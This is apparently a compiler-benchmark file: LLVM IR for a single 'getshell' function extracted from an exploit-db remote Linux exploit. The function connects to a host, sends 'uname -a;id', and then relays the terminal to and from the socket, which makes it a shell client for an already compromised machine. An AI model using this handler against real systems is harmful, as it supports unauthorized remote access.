; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22848.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22848.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [28 x i8] c"getshell(): socket() failed\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"getshell(): couldn't resolve\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"[!] connection failed: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c"[*] successfully connected: %s:%d.\0A\0A\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"getshell(): select() failed\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"getshell(): read() failed\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"getshell(): write() failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4097 x i8], align 16
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  %11 = load i32, i32* @AF_INET, align 4
  %12 = load i32, i32* @SOCK_STREAM, align 4
  %13 = load i32, i32* @IPPROTO_TCP, align 4
  %14 = call i32 @socket(i32 %11, i32 %12, i32 %13)
  store i32 %14, i32* %5, align 4
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %16, label %18

16:                                               ; preds = %2
  %17 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i32 0)
  br label %116

18:                                               ; preds = %2
  %19 = load i32, i32* @AF_INET, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %19, i32* %20, align 4
  %21 = load i8*, i8** %3, align 8
  %22 = call i32 @inet_addr(i8* %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %23, i32 0, i32 0
  store i32 %22, i32* %24, align 4
  %25 = icmp ne i32 %22, 0
  br i1 %25, label %26, label %40

26:                                               ; preds = %18
  %27 = load i8*, i8** %3, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %9, align 8
  %29 = icmp ne %struct.hostent* %28, null
  br i1 %29, label %32, label %30

30:                                               ; preds = %26
  %31 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 0)
  br label %116

32:                                               ; preds = %26
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %34 = bitcast %struct.TYPE_2__* %33 to i8*
  %35 = load %struct.hostent*, %struct.hostent** %9, align 8
  %36 = getelementptr inbounds %struct.hostent, %struct.hostent* %35, i32 0, i32 0
  %37 = load i64, i64* %36, align 8
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @memcpy(i8* %34, i8* %38, i32 4)
  br label %40

40:                                               ; preds = %32, %18
  %41 = load i16, i16* %4, align 2
  %42 = call i32 @htons(i16 zeroext %41)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %42, i32* %43, align 4
  %44 = load i32, i32* @SIGALRM, align 4
  %45 = load i32, i32* @sig_alarm, align 4
  %46 = call i32 @signal(i32 %44, i32 %45)
  %47 = load i32, i32* @TIMEOUT, align 4
  %48 = call i32 @alarm(i32 %47)
  %49 = load i8*, i8** %3, align 8
  %50 = load i16, i16* %4, align 2
  %51 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i8* %49, i16 zeroext %50)
  %52 = load i32, i32* %5, align 4
  %53 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %54 = call i64 @connect(i32 %52, %struct.sockaddr* %53, i32 12)
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %60

56:                                               ; preds = %40
  %57 = load i8*, i8** %3, align 8
  %58 = load i16, i16* %4, align 2
  %59 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %57, i16 zeroext %58)
  br label %116

60:                                               ; preds = %40
  %61 = call i32 @alarm(i32 0)
  %62 = load i8*, i8** %3, align 8
  %63 = load i16, i16* %4, align 2
  %64 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0), i8* %62, i16 zeroext %63)
  %65 = load i32, i32* @SIGINT, align 4
  %66 = load i32, i32* @SIG_IGN, align 4
  %67 = call i32 @signal(i32 %65, i32 %66)
  %68 = load i32, i32* %5, align 4
  %69 = call i32 @write(i32 %68, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i32 13)
  br label %70

70:                                               ; preds = %60, %115
  %71 = call i32 @FD_ZERO(i32* %7)
  %72 = call i32 @FD_SET(i32 0, i32* %7)
  %73 = load i32, i32* %5, align 4
  %74 = call i32 @FD_SET(i32 %73, i32* %7)
  %75 = load i32, i32* %5, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, i32* %7, i32 0, i32 0, i32 0)
  %78 = icmp slt i32 %77, 1
  br i1 %78, label %79, label %81

79:                                               ; preds = %70
  %80 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0), i32 0)
  br label %116

81:                                               ; preds = %70
  %82 = call i64 @FD_ISSET(i32 0, i32* %7)
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %100

84:                                               ; preds = %81
  %85 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %86 = call i32 @read(i32 0, i8* %85, i32 4096)
  store i32 %86, i32* %6, align 4
  %87 = icmp slt i32 %86, 1
  br i1 %87, label %88, label %90

88:                                               ; preds = %84
  %89 = call i32 @printe(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0), i32 0)
  br label %116

90:                                               ; preds = %84
  %91 = load i32, i32* %5, align 4
  %92 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %93 = load i32, i32* %6, align 4
  %94 = call i32 @write(i32 %91, i8* %92, i32 %93)
  %95 = load i32, i32* %6, align 4
  %96 = icmp ne i32 %94, %95
  br i1 %96, label %97, label %99

97:                                               ; preds = %90
  %98 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i32 0)
  br label %116

99:                                               ; preds = %90
  br label %100

100:                                              ; preds = %99, %81
  %101 = load i32, i32* %5, align 4
  %102 = call i64 @FD_ISSET(i32 %101, i32* %7)
  %103 = icmp ne i64 %102, 0
  br i1 %103, label %104, label %115

104:                                              ; preds = %100
  %105 = load i32, i32* %5, align 4
  %106 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %107 = call i32 @read(i32 %105, i8* %106, i32 4096)
  store i32 %107, i32* %6, align 4
  %108 = icmp slt i32 %107, 1
  br i1 %108, label %109, label %111

109:                                              ; preds = %104
  %110 = call i32 @exit(i32 0) #3
  unreachable

111:                                              ; preds = %104
  %112 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %113 = load i32, i32* %6, align 4
  %114 = call i32 @write(i32 1, i8* %112, i32 %113)
  br label %115

115:                                              ; preds = %111, %100
  br label %70

116:                                              ; preds = %97, %88, %79, %56, %30, %16
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @printf(i8*, i8*, i16 zeroext) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
